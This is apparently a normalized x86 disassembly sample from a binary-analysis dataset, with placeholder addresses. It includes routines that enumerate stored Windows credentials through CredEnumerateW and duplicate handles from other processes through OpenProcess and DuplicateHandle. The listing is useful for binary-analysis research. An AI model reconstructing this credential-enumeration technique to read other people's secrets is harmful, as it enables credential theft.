push 0xb
mov eax r--data
lea ecx [ esp + 0x148 ]
call sub_401c90
mov ecx [ esp + 0x2c ]
cmp ecx ebx
jne r-xdata
push edi
push esi
push edx
push ecx
push eax
sub esp 0x1c
mov edi esp
mov [ esp + 0x50 ] esp
xor eax eax
mov esi 0x7
mov [ edi + 0x14 ] esi
mov [ edi + 0x10 ] ebx
push ebx
lea ecx [ esp + 0x178 ]
mov [ edi ] ax
push ecx
or eax 0xffffffff
call sub_401be0
sub esp 0x1c
mov ecx esp
mov [ esp + 0x1fc ] 0x1
mov [ esp + 0x68 ] esp
xor edx edx
mov [ ecx + 0x14 ] esi
mov [ ecx + 0x10 ] ebx
push 0x8
mov eax r--data
mov [ ecx ] dx
call sub_401c90
mov [ esp + 0x1fc ] bl
call sub_407430
add esp 0x4c
jmp r-xdata
cmp [ esp + 0x158 ] 0x8
jb r-xdata
mov edx [ esp + 0x160 ]
push edx
call sub_43811c
add esp 0x4
push ebx
push eax
call sub_402d50
or eax 0x4
push ecx
push ecx
push 0x2e
push ecx
push eax
push ecx
push r--data
push rw-data
call sub_409de0
add esp 0xc
push eax
call sub_408170
add esp 0x4
push eax
call sub_40e950
add esp 0xc
push eax
call sub_408170
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
cmp ecx 0x1
jne r-xdata
mov ecx 0x9
lea eax [ esp + 0x194 ]
lea edx [ esp + 0x14 ]
lea edi [ ecx - 0xc ]
jmp r-xdata
mov al 0x1
mov ecx [ esp + 0x1a8 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x190 ]
xor ecx esp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov eax [ esp + 0x144 ]
push eax
call sub_43811c
add esp 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
cmp edi ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov eax [ esp + 0x28 ]
lea eax [ esp + 0x17c ]
mov ecx 0x5
lea edx [ esp + 0x18 ]
mov edi 0xffffffe8
mov esi 0x3
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov edi 0x4
push ebx
push eax
call sub_402d50
jmp r-xdata
or eax 0x4
sub_418590
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_453408
mov eax [ fs : 0x0 ]
push eax
sub esp 0x68
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x60 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x78 ]
mov [ fs : 0x0 ] eax
lea eax [ esp + 0x18 ]
push eax
lea ecx [ esp + 0x24 ]
push ecx
xor edi edi
push 0x1
push edi
mov [ esp + 0x30 ] edi
mov [ esp + 0x28 ] edi
call [ CredEnumerateW@IAT ]
test eax eax
je r-xdata
push edi
lea edx [ esp + 0x58 ]
push 0x1
push edx
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push rw-data
mov [ esp + 0x90 ] 0x2
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor ebx ebx
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov edx [ esp + 0x20 ]
push edx
push ecx
push r--data
push rw-data
call sub_409de0
add esp 0xc
push eax
call sub_408170
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov ecx [ eax + esi + 0xc ]
xor ebx ebx
test cl 0x6
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
cmp ebx edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
cmp ebx edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
cmp [ esp + 0x68 ] 0x8
jb r-xdata
mov eax [ ecx + 0xc ]
or eax ebx
cmp [ ecx + 0x38 ] edi
jne r-xdata
mov ebx 0x4
mov [ esp + 0x14 ] edi
cmp [ esp + 0x20 ] edi
jbe r-xdata
mov eax [ ecx + 0xc ]
or eax ebx
cmp [ ecx + 0x38 ] edi
jne r-xdata
mov ebx 0x4
mov al 0x1
mov ecx [ esp + 0x78 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x60 ]
xor ecx esp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov edx [ esp + 0x54 ]
push edx
call sub_43811c
add esp 0x4
push edi
push eax
call sub_402d50
or eax 0x4
mov ecx [ esp + 0x18 ]
push ecx
call [ CredFree@IAT ]
jmp r-xdata
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
mov ecx [ edx + eax * 4 ]
cmp [ ecx + 0x18 ] edi
jbe r-xdata
push edi
push eax
call sub_402d50
or eax 0x4
mov eax [ esp + 0x14 ]
inc eax
mov [ esp + 0x14 ] eax
cmp eax [ esp + 0x20 ]
jb r-xdata
push 0xa
mov ecx rw-data
call sub_408340
mov edx [ rw-data ]
mov eax [ edx + 0x4 ]
xor esi esi
test [ eax + rw-data ] 0x6
jne r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x4 ]
add ecx rw-data
cmp esi edi
je r-xdata
mov eax [ eax + rw-data ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
mov ecx [ edx + eax * 4 ]
mov edx [ ecx + 0x8 ]
push edx
push ecx
push r--data
push rw-data
call sub_409de0
add esp 0xc
push eax
call sub_409de0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor ebx ebx
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov eax [ ecx + 0xc ]
or eax esi
cmp [ ecx + 0x38 ] edi
jne r-xdata
mov esi 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
cmp ebx edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push edi
push eax
call sub_402d50
or eax 0x4
mov eax [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov ecx [ eax + edx * 4 ]
mov eax [ ecx + 0x2c ]
cmp eax edi
je r-xdata
mov eax [ ecx + 0xc ]
or eax ebx
cmp [ ecx + 0x38 ] edi
jne r-xdata
mov ebx 0x4
xor edx edx
mov [ esp + 0x4c ] 0x7
mov [ esp + 0x48 ] edi
mov [ esp + 0x38 ] dx
mov eax [ esp + 0x14 ]
mov [ esp + 0x80 ] edi
mov ecx [ esp + 0x18 ]
mov edx [ ecx + eax * 4 ]
mov eax [ edx + 0x4 ]
dec eax
cmp eax 0x5
ja r-xdata
push eax
push ecx
push r--data
push rw-data
call sub_409de0
add esp 0xc
push eax
call sub_409de0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov edx [ esi ]
mov eax [ edx + 0x4 ]
xor ebx ebx
test [ eax + esi + 0xc ] 0x6
jne r-xdata
push edi
push eax
call sub_402d50
or eax 0x4
push 0x1
mov eax r--data
jmp [ eax * 4 + jump_table_418d00 ]
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
cmp ebx edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
cmp ebx edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0x7
mov eax r--data
jmp r-xdata
push 0xf
mov eax r--data
jmp r-xdata
push 0x12
mov eax r--data
jmp r-xdata
push 0x17
mov eax r--data
jmp r-xdata
push 0x12
mov eax r--data
jmp r-xdata
push 0xf
mov eax r--data
jmp r-xdata
mov eax [ ecx + 0xc ]
or eax ebx
cmp [ ecx + 0x38 ] edi
jne r-xdata
mov ebx 0x4
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
mov ecx [ edx + eax * 4 ]
mov edx [ ecx + 0x30 ]
push edx
push ecx
push r--data
push rw-data
call sub_409de0
add esp 0xc
push eax
call sub_409de0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor ebx ebx
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov eax [ ecx + 0xc ]
or eax ebx
cmp [ ecx + 0x38 ] edi
jne r-xdata
mov ebx 0x4
lea ecx [ esp + 0x3c ]
call sub_401c90
mov eax [ esp + 0x18 ]
push 0x29
push ecx
mov ecx [ esp + 0x1c ]
mov edx [ eax + ecx * 4 ]
mov eax [ edx + 0x4 ]
push eax
push ecx
push r--data
push ecx
lea ecx [ esp + 0x50 ]
push ecx
push ecx
push r--data
push rw-data
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0xc
push eax
call sub_409de0
add esp 0xc
push eax
call sub_408170
add esp 0x4
push eax
call sub_40e950
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov edx [ esi ]
mov eax [ edx + 0x4 ]
xor ebx ebx
test [ eax + esi + 0xc ] 0x6
jne r-xdata
push edi
push eax
call sub_402d50
or eax 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
cmp ebx edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push edi
push eax
call sub_402d50
or eax 0x4
mov eax [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov ecx [ eax + edx * 4 ]
mov esi [ ecx + 0x18 ]
xor ebx ebx
mov [ esp + 0x13 ] 0x1
cmp esi edi
jbe r-xdata
mov eax [ ecx + 0xc ]
or eax ebx
cmp [ ecx + 0x38 ] edi
jne r-xdata
mov ebx 0x4
mov edx [ esp + 0x14 ]
mov eax [ eax + edx * 4 ]
test [ eax + 0x18 ] 0x1f
je r-xdata
mov edx [ esp + 0x14 ]
mov eax [ eax + edx * 4 ]
cmp [ eax + 0x18 ] 0x1
mov ecx [ eax + 0x1c ]
mov cl [ ebx + ecx ]
mov [ esp + 0x1f ] cl
jbe r-xdata
push edi
push eax
call sub_402d50
or eax 0x4
cmp [ esp + 0x13 ] 0x0
je r-xdata
push 0xa
mov ecx rw-data
call sub_408340
mov ecx [ rw-data ]
mov eax [ ecx + 0x4 ]
xor esi esi
test [ eax + rw-data ] 0x6
jne r-xdata
xor eax eax
test bl 0x1
je r-xdata
add esi 0xfffffffe
cmp ebx esi
jae r-xdata
mov [ esp + 0x80 ] 0xffffffff
cmp [ esp + 0x4c ] 0x8
jb r-xdata
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x18 ]
mov eax [ eax + edx * 4 ]
mov ecx [ eax + 0x18 ]
mov eax [ eax + 0x1c ]
shr ecx 0x1
xor edx edx
push ecx
lea ecx [ esp + 0x58 ]
mov [ esp + 0x6c ] 0x7
mov [ esp + 0x68 ] edi
mov [ esp + 0x58 ] dx
call sub_401c90
lea eax [ esp + 0x54 ]
push eax
push ecx
push r--data
push rw-data
mov [ esp + 0x90 ] 0x1
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
xor ebx ebx
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x4 ]
add ecx rw-data
cmp esi edi
je r-xdata
mov eax [ eax + rw-data ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
test cl cl
setne al
test cl cl
sete al
jmp r-xdata
mov eax 0x1
mov eax [ esp + 0x38 ]
push eax
call sub_43811c
add esp 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
cmp ebx edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov eax [ ecx + 0xc ]
or eax esi
cmp [ ecx + 0x38 ] edi
jne r-xdata
mov esi 0x4
xor eax eax
jmp r-xdata
cmp eax edi
jne r-xdata
mov eax [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov ecx [ eax + edx * 4 ]
mov esi [ ecx + 0x18 ]
cmp ebx esi
jb r-xdata
push 0xa
mov ecx rw-data
call sub_408340
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
xor esi esi
test [ eax + rw-data ] 0x6
jne r-xdata
cmp [ esp + 0x68 ] 0x8
jb r-xdata
mov eax [ ecx + 0xc ]
or eax ebx
cmp [ ecx + 0x38 ] edi
jne r-xdata
mov ebx 0x4
push edi
push eax
call sub_402d50
or eax 0x4
and [ esp + 0x13 ] al
push edi
lea edx [ esp + 0x28 ]
push 0x2
push edx
call sub_4374b3
mov edx [ eax + 0xc ]
mov ecx [ rw-data ]
mov ecx [ ecx + 0x4 ]
add esp 0xc
push edx
mov edx [ eax + 0x8 ]
mov eax [ eax ]
add ecx rw-data
push edx
push ecx
call eax
mov ecx [ rw-data ]
mov eax [ ecx + 0x4 ]
add eax rw-data
mov edx 0x30
mov [ eax + 0x40 ] dx
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
movzx edx [ esp + 0x2b ]
add eax rw-data
mov ecx [ eax + 0x14 ]
add esp 0xc
and ecx 0xfffff9ff
push 0x20
or ecx 0x800
push ecx
push edx
push rw-data
mov [ eax + 0x14 ] ecx
call sub_40eee0
add esp 0x4
push eax
call sub_40e950
inc ebx
add esp 0x8
test bl 0x1f
jne r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x4 ]
add ecx rw-data
cmp esi edi
je r-xdata
mov eax [ eax + rw-data ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov edx [ esp + 0x54 ]
push edx
call sub_43811c
add esp 0x4
push edi
push eax
call sub_402d50
or eax 0x4
mov eax [ ecx + 0xc ]
or eax esi
cmp [ ecx + 0x38 ] edi
jne r-xdata
mov esi 0x4
push edi
push eax
call sub_402d50
or eax 0x4
sub_418d50
push esi
mov esi eax
mov edx [ esi ]
mov eax [ esi + 0x4 ]
sub eax edx
sar eax 0x2
cmp eax 0x3ffffffe
jbe r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edx
inc eax
sar ecx 0x2
cmp eax ecx
jbe r-xdata
push r--data
call sub_435a79
pop esi
retn
push edi
mov edx ecx
shr edx 0x1
mov edi 0x3fffffff
sub edi edx
cmp edi ecx
pop edi
jae r-xdata
add ecx edx
xor ecx ecx
jmp r-xdata
push ecx
call sub_418da0
mov ecx eax
cmp ecx eax
jae r-xdata
sub_418da0
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
cmp ecx 0x3fffffff
jbe r-xdata
mov eax [ esi + 0x8 ]
sub eax [ esi ]
sar eax 0x2
cmp eax ecx
jae r-xdata
push r--data
call sub_435a79
pop ebp
retn 0x4
push ebx
push edi
call sub_418e20
mov ecx [ esi + 0x4 ]
mov ebx eax
mov eax [ esi ]
sub ecx eax
sar ecx 0x2
add ecx ecx
add ecx ecx
push ecx
push eax
push ebx
call sub_437db0
mov eax [ esi ]
mov edi [ esi + 0x4 ]
sub edi eax
add esp 0xc
sar edi 0x2
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
lea ecx [ ebx + edi * 4 ]
lea eax [ ebx + edx * 4 ]
pop edi
mov [ esi ] ebx
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] ecx
pop ebx
push eax
call sub_43811c
add esp 0x4
sub_418e20
push ebp
mov ebp esp
sub esp 0x10
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn
cmp ecx 0x3fffffff
ja r-xdata
lea ecx [ ebp - 0x4 ]
push ecx
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_437cb3
push r--data
lea edx [ ebp - 0x10 ]
push edx
mov [ ebp - 0x10 ] r--data
call sub_43c3a5
lea eax [ ecx * 4 ]
push eax
call sub_438178
add esp 0x4
test eax eax
jne r-xdata
sub_418ec0
push ebp
mov ebp esp
push 0xffffffff
push sub_45405e
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor esi esi
mov edi ecx
mov [ ebp - 0xc8 ] esi
mov [ ebp - 0xcc ] edi
mov [ edi ] esi
mov [ edi + 0x4 ] esi
mov [ edi + 0x8 ] esi
mov [ ebp - 0x4 ] esi
xor eax eax
mov [ ebp - 0xc0 ] ax
mov ebx 0x7
push 0x4
mov eax r--data
lea ecx [ ebp - 0xc0 ]
mov [ ebp - 0xc8 ] 0x1
mov [ ebp - 0xc4 ] sub_419110
mov [ ebp - 0xac ] ebx
mov [ ebp - 0xb0 ] esi
call sub_401c90
mov [ ebp - 0x4 ] 0x1
xor ecx ecx
mov [ ebp - 0xa4 ] cx
push 0x4d
mov eax r--data
lea ecx [ ebp - 0xa4 ]
mov [ ebp - 0x90 ] ebx
mov [ ebp - 0x94 ] esi
call sub_401c90
lea eax [ ebp - 0xc4 ]
mov [ ebp - 0x4 ] 0x2
call sub_4173f0
xor edx edx
push 0xb
mov eax r--data
lea ecx [ ebp - 0x84 ]
mov [ ebp - 0x88 ] sub_419890
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x74 ] esi
mov [ ebp - 0x84 ] dx
call sub_401c90
mov [ ebp - 0x4 ] 0x3
xor eax eax
mov [ ebp - 0x68 ] ax
push 0x49
mov eax r--data
lea ecx [ ebp - 0x68 ]
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x58 ] esi
call sub_401c90
lea eax [ ebp - 0x88 ]
mov [ ebp - 0x4 ] 0x4
call sub_4173f0
xor ecx ecx
mov [ ebp - 0x48 ] cx
push 0x10
mov eax r--data
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4c ] sub_41a010
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x38 ] esi
call sub_401c90
mov [ ebp - 0x4 ] 0x5
xor edx edx
push 0x3f
mov eax r--data
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x2c ] dx
call sub_401c90
lea eax [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x6
call sub_4173f0
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
xor ecx ecx
cmp [ ebp - 0x34 ] 0x8
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x2c ] cx
jb r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_43811c
add esp 0x4
xor eax eax
cmp [ ebp - 0x54 ] 0x8
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x48 ] ax
jb r-xdata
mov edx [ ebp - 0x48 ]
push edx
call sub_43811c
add esp 0x4
xor edx edx
cmp [ ebp - 0x70 ] 0x8
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x68 ] dx
jb r-xdata
mov ecx [ ebp - 0x68 ]
push ecx
call sub_43811c
add esp 0x4
xor ecx ecx
cmp [ ebp - 0x90 ] 0x8
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x74 ] esi
mov [ ebp - 0x84 ] cx
jb r-xdata
mov eax [ ebp - 0x84 ]
push eax
call sub_43811c
add esp 0x4
xor eax eax
cmp [ ebp - 0xac ] 0x8
mov [ ebp - 0x90 ] ebx
mov [ ebp - 0x94 ] esi
mov [ ebp - 0xa4 ] ax
jb r-xdata
mov edx [ ebp - 0xa4 ]
push edx
call sub_43811c
add esp 0x4
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0xc0 ]
push ecx
call sub_43811c
add esp 0x4
sub_419110
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_4533bb
mov eax [ fs : 0x0 ]
push eax
sub esp 0xd0
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0xc8 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xe0 ]
mov [ fs : 0x0 ] eax
mov ebx [ ebp + 0x8 ]
push 0x10
call sub_438178
xor esi esi
add esp 0x4
cmp eax esi
je r-xdata
mov [ esp + 0x24 ] esi
mov [ eax ] esi
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] esi
mov [ esp + 0x24 ] eax
jmp r-xdata
mov [ esp + 0x14 ] esi
mov [ eax ] esi
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] esi
mov [ esp + 0x14 ] eax
jmp r-xdata
mov edi [ esp + 0x24 ]
xor ecx ecx
call sub_40b0d0
push 0x10
mov [ esp + 0x17 ] al
call sub_438178
add esp 0x4
cmp eax esi
je r-xdata
mov [ esp + 0x2c ] esi
cmp [ eax + 0x14 ] 0x8
jb r-xdata
mov eax [ ebx ]
cmp eax [ ebx + 0x4 ]
je r-xdata
push esi
lea edx [ esp + 0x88 ]
push 0x1
push edx
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push rw-data
mov [ esp + 0xf8 ] 0x4
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov edi eax
push 0xa
mov ecx edi
call sub_408340
mov eax [ edi ]
mov eax [ eax + 0x4 ]
xor ebx ebx
test [ eax + edi + 0xc ] 0x6
jne r-xdata
mov ebx [ edi ]
mov [ esp + 0x1c ] ebx
cmp ebx [ edi + 0x4 ]
je r-xdata
push eax
call sub_43a187
add esp 0x4
mov [ esp + 0x2c ] eax
jmp r-xdata
mov eax [ eax ]
mov ecx [ edi ]
mov ecx [ ecx + 0x4 ]
add ecx edi
cmp ebx esi
je r-xdata
mov eax [ eax + edi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
cmp edi esi
je r-xdata
mov eax [ ebx ]
push eax
push esi
push 0x40
call [ OpenProcess@IAT ]
mov edi eax
mov [ esp + 0x30 ] edi
cmp edi esi
je r-xdata
mov eax [ ebx ]
cmp eax [ ebx + 0x4 ]
mov edi [ esp + 0x14 ]
sete al
xor ecx ecx
test al al
setne cl
lea edx [ esp + 0x2c ]
dec ecx
and ecx edx
push ecx
call sub_40e5c0
add esp 0x4
test al al
je r-xdata
cmp [ esp + 0x98 ] 0x8
jb r-xdata
mov eax [ ecx + 0xc ]
or eax ebx
cmp [ ecx + 0x38 ] esi
jne r-xdata
mov ebx 0x4
mov al 0x1
mov ecx [ esp + 0xe0 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0xc8 ]
xor ecx esp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov eax [ edi ]
cmp eax esi
je r-xdata
mov ecx [ esp + 0x14 ]
add ebx 0x10
mov [ esp + 0x1c ] ebx
cmp ebx [ ecx + 0x4 ]
jne r-xdata
push 0x2
push esi
push esi
lea ecx [ esp + 0x2c ]
push ecx
call [ GetCurrentProcess@IAT ]
movzx edx [ ebx + 0x6 ]
push eax
push edx
push edi
call [ DuplicateHandle@IAT ]
test eax eax
je r-xdata
mov edi [ esp + 0x14 ]
mov edx [ esp + 0x84 ]
push edx
call sub_43811c
add esp 0x4
push esi
push eax
call sub_402d50
or eax 0x4
push edi
mov [ edi ] esi
mov [ edi + 0x4 ] esi
mov [ edi + 0x8 ] esi
call sub_43811c
add esp 0x4
push eax
call sub_43811c
add esp 0x4
jmp r-xdata
push edi
call [ CloseHandle@IAT ]
xor eax eax
mov [ esp + 0x7c ] 0x7
mov [ esp + 0x78 ] esi
mov [ esp + 0x68 ] ax
mov [ esp + 0xe8 ] esi
mov edi [ esp + 0x20 ]
lea ecx [ esp + 0x28 ]
push ecx
mov [ esp + 0x2c ] esi
call sub_40e710
add esp 0x4
test al al
je r-xdata
mov edx [ esp + 0x20 ]
push edx
call [ CloseHandle@IAT ]
mov [ esp + 0xe8 ] 0xffffffff
cmp [ esp + 0x7c ] 0x8
jb r-xdata
mov eax [ esp + 0x28 ]
movzx edx [ eax ]
mov eax [ eax + 0x4 ]
shr edx 0x1
push edx
lea ecx [ esp + 0x6c ]
call sub_401c90
mov eax [ esp + 0x28 ]
push eax
call sub_438111
mov eax [ esp + 0x6c ]
mov edi 0x8
add esp 0x4
cmp [ esp + 0x7c ] edi
jae r-xdata
mov edi [ esp + 0x30 ]
mov eax [ esp + 0x68 ]
push eax
call sub_43811c
add esp 0x4
push r--data
push eax
call sub_438e70
add esp 0x8
test eax eax
mov eax [ esp + 0x68 ]
sete bl
mov [ esp + 0x1b ] bl
cmp [ esp + 0x7c ] edi
jae r-xdata
lea eax [ esp + 0x68 ]
push r--data
push eax
call sub_438e70
add esp 0x8
test eax eax
sete al
mov [ esp + 0x1a ] al
test bl bl
jne r-xdata
lea eax [ esp + 0x68 ]
push esi
lea ecx [ esp + 0x58 ]
push 0x5
push ecx
call sub_4374b3
mov edx [ rw-data ]
mov ecx [ edx + 0x4 ]
mov edx [ eax + 0xc ]
add esp 0xc
push edx
mov edx [ eax + 0x8 ]
mov eax [ eax ]
add ecx rw-data
push edx
push ecx
call eax
mov ecx [ rw-data ]
mov eax [ ecx + 0x4 ]
mov edi [ esp + 0x28 ]
add esp 0xc
add eax rw-data
push r--data
mov edx 0x20
mov [ eax + 0x40 ] dx
mov eax [ edi ]
push ecx
push eax
push rw-data
call sub_408170
add esp 0x4
push eax
call sub_409de0
add esp 0x8
cmp [ esp + 0x13 ] 0x0
je r-xdata
test al al
je r-xdata
push esi
lea ecx [ esp + 0x38 ]
push 0x5
push ecx
call sub_4374b3
add esp 0xc
push r--data
push rw-data
mov ebx eax
call sub_409de0
mov edi eax
add esp 0x8
cmp edi esi
jne r-xdata
push 0x40
call sub_438178
add esp 0x4
cmp eax esi
je r-xdata
mov ebx [ esp + 0x1c ]
mov edx [ edi ]
mov eax [ edx + 0x4 ]
add eax edi
xor eax eax
jmp r-xdata
xor ebx ebx
xor ecx ecx
mov [ eax + 0x38 ] 0x7
mov [ eax + 0x34 ] esi
mov [ eax + 0x24 ] cx
mov ebx eax
jmp r-xdata
cmp [ esp + 0x1a ] 0x0
je r-xdata
mov ebx 0x7
xor eax eax
mov [ esp + 0x98 ] ebx
mov [ esp + 0x94 ] esi
mov [ esp + 0x84 ] ax
xor ecx ecx
mov [ esp + 0xb4 ] ebx
mov [ esp + 0xb0 ] esi
mov [ esp + 0xa0 ] cx
lea edx [ esp + 0xa0 ]
push edx
lea eax [ esp + 0x88 ]
mov [ esp + 0xec ] 0x2
mov edi [ esp + 0x24 ]
push eax
call sub_40d650
add esp 0x8
test al al
je r-xdata
mov ecx [ ebx + 0xc ]
mov edx [ ebx + 0x8 ]
push ecx
push edx
push eax
mov eax [ ebx ]
call eax
mov ecx [ edi ]
mov eax [ ecx + 0x4 ]
add esp 0xc
push 0x9
push ecx
mov edx 0x20
mov [ eax + edi + 0x40 ] dx
lea eax [ esp + 0x70 ]
push eax
push ecx
push 0x9
push ecx
mov ecx [ esp + 0x34 ]
movzx edx [ ecx + 0x6 ]
push edx
push edi
call sub_41a660
add esp 0x4
push eax
call sub_40e950
add esp 0xc
push eax
call sub_40a0a0
add esp 0xc
push eax
call sub_40e950
add esp 0x8
cmp [ esp + 0x1b ] 0x0
je r-xdata
test ebx ebx
je r-xdata
push 0x0
lea ecx [ esp + 0x48 ]
push 0x19
push ecx
call sub_4374b3
mov edx [ rw-data ]
mov ecx [ edx + 0x4 ]
mov edx [ eax + 0xc ]
add esp 0xc
push edx
mov edx [ eax + 0x8 ]
mov eax [ eax ]
add ecx rw-data
push edx
push ecx
call eax
mov ecx [ rw-data ]
mov eax [ ecx + 0x4 ]
add eax rw-data
mov edx 0x20
mov [ eax + 0x40 ] dx
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
add eax rw-data
mov ecx [ eax + 0x14 ]
add esp 0xc
and ecx 0xfffffe7f
or ecx 0x40
push sub_418ea0
push ecx
lea edx [ ebx + 0x24 ]
push edx
push rw-data
mov [ eax + 0x14 ] ecx
call sub_40a0a0
add esp 0xc
mov esi eax
call sub_40e790
